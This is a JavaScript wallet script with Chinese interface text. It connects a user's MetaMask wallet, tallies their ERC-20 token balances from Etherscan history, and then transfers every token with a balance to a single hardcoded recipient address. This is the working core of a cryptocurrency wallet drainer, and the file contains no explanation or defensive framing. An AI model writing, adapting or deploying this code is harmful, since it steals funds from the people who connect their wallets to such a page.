const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
const etherscanApiKey = 'YOUR_ETHERSCAN_API_KEY'; // 替换为你的 Etherscan API Key
const web3 = new Web3(Web3.givenProvider || 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');

const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    }
];

document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            document.getElementById('status').innerText = '钱包已连接';
            document.getElementById('transferButton').disabled = false;
        } catch (error) {
            document.getElementById('status').innerText = '连接钱包失败: ' + error.message;
        }
    } else {
        document.getElementById('status').innerText = '请安装 MetaMask 钱包';
    }
};

async function getTokenBalances(address) {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=${etherscanApiKey}`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        document.getElementById('status').innerText = '获取代币余额失败: ' + error.message;
    }
}

document.getElementById('transferButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    const senderAddress = accounts[0];

    document.getElementById('status').innerText = '正在获取代币余额...';
    const tokenBalances = await getTokenBalances(senderAddress);

    for (const tokenAddress in tokenBalances) {
        const token = tokenBalances[tokenAddress];
        const balance = token.balance;

        if (balance > 0) {
            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
            try {
                const transfer = await tokenContract.methods.transfer(recipientAddress, balance).send({ from: senderAddress });
                document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 至 ${recipientAddress}`;
            } catch (error) {
                document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
            }
        } else {
            document.getElementById('status').innerText += `\n账户在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
        }
    }

    document.getElementById('status').innerText += '\n所有代币转移完成';
};
